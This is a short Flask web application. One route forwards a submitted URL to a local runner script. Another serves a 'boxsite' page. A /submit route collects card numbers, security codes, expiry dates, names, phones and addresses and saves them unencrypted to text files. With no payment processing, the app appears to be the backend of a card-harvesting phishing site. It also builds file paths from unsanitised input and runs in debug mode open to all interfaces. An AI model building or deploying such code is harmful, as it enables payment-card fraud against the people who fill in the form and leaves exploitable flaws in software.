from flask import Flask, request, jsonify, render_template
import subprocess
import os

app = Flask(__name__)

# Define the directory to save submissions
SUBMISSIONS_DIR = 'submissions'

if not os.path.exists(SUBMISSIONS_DIR):
    os.makedirs(SUBMISSIONS_DIR)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/run_script', methods=['POST'])
def run_script():
    # Get the URL from the request data
    data = request.get_json()
    url = data.get('url')
    if not url:
        app.logger.error('No URL provided')
        return jsonify({'error': 'No URL provided'}), 400

    app.logger.info(f'Received URL: {url}')

    # Ensure the correct path to runner.py
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'runner.py')

    try:
        # Start the runner.py script
        process = subprocess.Popen(['python3', script_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Send the URL to the script via stdin
        stdout, stderr = process.communicate(input=f"{url}\n".encode())

        output = stdout.decode('utf-8')
        error = stderr.decode('utf-8')

        app.logger.info(f'Script output: {output}')
        if error:
            app.logger.error(f'Script error: {error}')
        
        return jsonify({'output': output, 'error': error})
    except subprocess.CalledProcessError as e:
        app.logger.error(f'Script execution failed: {str(e)}')
        return jsonify({'error': str(e)}), 400

@app.route('/boxsite')
def boxsite():
    return render_template('boxsite.html')

@app.route('/submit', methods=['POST'])
def submit():
    card_number = request.form.get('card_number')
    name = request.form.get('name')
    expiration_date = request.form.get('expiration_date')
    security_code = request.form.get('security_code')
    phone = request.form.get('phone')
    address = request.form.get('address')

    data = (
        f"Credit Card Number: {card_number}\n"
        f"Name on Card: {name}\n"
        f"Expiration Date: {expiration_date}\n"
        f"Security Code: {security_code}\n"
        f"Phone Number: {phone}\n"
        f"Address: {address}\n"
    )

    filename = os.path.join(SUBMISSIONS_DIR, f'{phone}.txt')

    with open(filename, 'w') as file:
        file.write(data)

    return 'Form submitted successfully!'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
